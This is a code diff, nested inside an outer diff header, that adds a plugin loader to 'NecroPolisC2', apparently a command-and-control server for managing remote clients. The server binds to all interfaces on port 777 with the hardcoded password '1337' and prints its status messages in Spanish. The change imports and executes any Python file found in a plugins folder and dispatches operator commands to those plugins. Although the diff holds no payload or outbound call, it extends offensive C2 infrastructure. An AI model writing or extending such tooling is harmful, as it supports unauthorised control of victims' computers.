@@ -1,0 +1,70 @@
+diff --git a/necropolisc2server.py b/necropolisc2server.py
+index 07e401e..cdef123 100644
+--- a/necropolisc2server.py
++++ b/necropolisc2server.py
+@@ -7,6 +7,9 @@
+ import select
+ import signal
++import importlib.util
++import os
+
+ class ClientHandler(threading.Thread):
+@@ class NecroPolisC2:
+     def __init__(self, host='0.0.0.0', port=777, password='1337'):
+         self.host = host
+         self.port = port
+         self.password = password
+         self.server_socket = None
+         self.clients = {}
+         self.client_counter = 0
+         self.selected_client = None
+         self.lock = threading.Lock()
+         self.running = False
+         self.prompt = "necropolisc2> "
++        self.plugin_commands = {}
+
++    def register_command(self, name, func, help_text=""):
++        self.plugin_commands[name] = (func, help_text)
++
++    def load_plugins(self):
++        plugins_dir = "plugins"
++        if not os.path.exists(plugins_dir):
++            os.makedirs(plugins_dir)
++        for filename in os.listdir(plugins_dir):
++            if filename.endswith(".py"):
++                plugin_name = filename[:-3]
++                plugin_path = os.path.join(plugins_dir, filename)
++                try:
++                    spec = importlib.util.spec_from_file_location(plugin_name, plugin_path)
++                    plugin = importlib.util.module_from_spec(spec)
++                    spec.loader.exec_module(plugin)
++                    if hasattr(plugin, "register"):
++                        plugin.register(self)
++                        print(f"[+] Plugin cargado: {plugin_name}")
++                    else:
++                        print(f"[-] Plugin {plugin_name} no tiene función 'register'")
++                except Exception as e:
++                    print(f"[!] Error cargando plugin {plugin_name}: {e}")
+
+     def start(self):
+         self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+         self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+         self.server_socket.bind((self.host, self.port))
+         self.server_socket.listen(100)
+         self.running = True
++        self.load_plugins()
+         print(f"[+] NecroPolisC2 iniciado en {self.host}:{self.port} con contraseña '{self.password}'")
+         threading.Thread(target=self.accept_clients, daemon=True).start()
+         self.cmd_loop()
+@@ def cmd_loop(self):
+                 cmd = input(self.prompt).strip()
+                 if not cmd:
+                     continue
+                 parts = cmd.split()
+                 base_cmd = parts[0].lower()
++
++                if base_cmd in self.plugin_commands:
++                    func, _ = self.plugin_commands[base_cmd]
++                    func(self, parts[1:])
++                    continue
+
